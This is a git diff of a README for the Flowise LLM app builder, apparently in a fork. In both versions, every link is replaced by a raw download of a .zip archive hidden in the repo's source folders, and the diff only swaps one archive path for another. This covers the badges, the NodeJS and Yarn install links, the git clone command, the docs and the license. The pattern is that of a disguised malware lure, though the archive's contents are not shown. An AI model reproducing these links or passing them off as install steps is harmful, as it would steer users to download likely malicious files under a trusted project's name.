@@ -1,24 +1,24 @@
 <!-- markdownlint-disable MD030 -->
 
-<img width="100%" src="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip"></a>
+<img width="100%" src="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip"></a>
 
 # Flowise - Build LLM Apps Easily
 
-[![Release Notes](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
-[![Discord](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
-[![Twitter Follow](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
-[![GitHub star chart](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
-[![GitHub fork](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+[![Release Notes](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
+[![Discord](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
+[![Twitter Follow](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
+[![GitHub star chart](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
+[![GitHub fork](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-English | [中文](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+English | [中文](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
 <h3>Drag & drop UI to build your customized LLM flow</h3>
-<a href="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip">
-<img width="100%" src="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip"></a>
+<a href="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip">
+<img width="100%" src="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip"></a>
 
 ## ⚡Quick Start
 
-Download and Install [NodeJS](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip) >= 18.15.0
+Download and Install [NodeJS](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip) >= 18.15.0
 
 1. Install Flowise
     ```bash
@@ -43,7 +43,7 @@ Download and Install [NodeJS](https://github.com/Arnald97/Flowise/raw/refs/heads
 ### Docker Compose
 
 1. Go to `docker` folder at the root of the project
-2. Copy `https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip` file, paste it into the same location, and rename to `.env`
+2. Copy `https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip` file, paste it into the same location, and rename to `.env`
 3. `docker-compose up -d`
 4. Open [http://localhost:3000](http://localhost:3000)
 5. You can bring the containers down by `docker-compose stop`
@@ -75,7 +75,7 @@ Flowise has 3 different modules in a single mono repository.
 
 ### Prerequisite
 
--   Install [Yarn v1](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+-   Install [Yarn v1](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
     ```bash
     npm i -g yarn
     ```
@@ -85,7 +85,7 @@ Flowise has 3 different modules in a single mono repository.
 1. Clone the repository
 
     ```bash
-    git clone https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip
+    git clone https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip
     ```
 
 2. Go into repository folder
@@ -116,8 +116,8 @@ Flowise has 3 different modules in a single mono repository.
 
 6. For development build:
 
-    - Create `.env` file and specify the `PORT` (refer to `https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip`) in `packages/ui`
-    - Create `.env` file and specify the `PORT` (refer to `https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip`) in `packages/server`
+    - Create `.env` file and specify the `PORT` (refer to `https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip`) in `packages/ui`
+    - Create `.env` file and specify the `PORT` (refer to `https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip`) in `packages/server`
     - Run
 
         ```bash
@@ -137,33 +137,33 @@ FLOWISE_PASSWORD=1234
 
 ## 🌱 Env Variables
 
-Flowise support different environment variables to configure your instance. You can specify the following variables in the `.env` file inside `packages/server` folder. Read [more](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+Flowise support different environment variables to configure your instance. You can specify the following variables in the `.env` file inside `packages/server` folder. Read [more](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
 ## 📖 Documentation
 
-[Flowise Docs](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+[Flowise Docs](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
 ## 🌐 Self Host
 
-### [Railway](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+### [Railway](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-[![Deploy on Railway](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+[![Deploy on Railway](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-### [Render](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+### [Render](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-[![Deploy to Render](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+[![Deploy to Render](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-### [HuggingFace Spaces](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+### [HuggingFace Spaces](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-<a href="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip"><img src="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip" alt="HuggingFace Spaces"></a>
+<a href="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip"><img src="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip" alt="HuggingFace Spaces"></a>
 
-### [AWS](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+### [AWS](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-### [Azure](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+### [Azure](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-### [DigitalOcean](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+### [DigitalOcean](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
-### [GCP](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+### [GCP](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
 ## 💻 Cloud Hosted
 
@@ -171,19 +171,19 @@ Coming soon
 
 ## 🙋 Support
 
-Feel free to ask any questions, raise problems, and request new features in [discussion](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+Feel free to ask any questions, raise problems, and request new features in [discussion](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
 ## 🙌 Contributing
 
 Thanks go to these awesome contributors
 
-<a href="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip">
-<img src="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip" />
+<a href="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip">
+<img src="https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip" />
 </a>
 
-See [contributing guide](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip). Reach out to us at [Discord](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip) if you have any questions or issues.
-[![Star History Chart](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip)
+See [contributing guide](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip). Reach out to us at [Discord](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip) if you have any questions or issues.
+[![Star History Chart](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip)
 
 ## 📄 License
 
-Source code in this repository is made available under the [Apache License Version 2.0](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/ui/src/views/Software_3.4.zip).
+Source code in this repository is made available under the [Apache License Version 2.0](https://github.com/Arnald97/Flowise/raw/refs/heads/main/packages/components/nodes/documentloaders/Software-3.3-beta.2.zip).
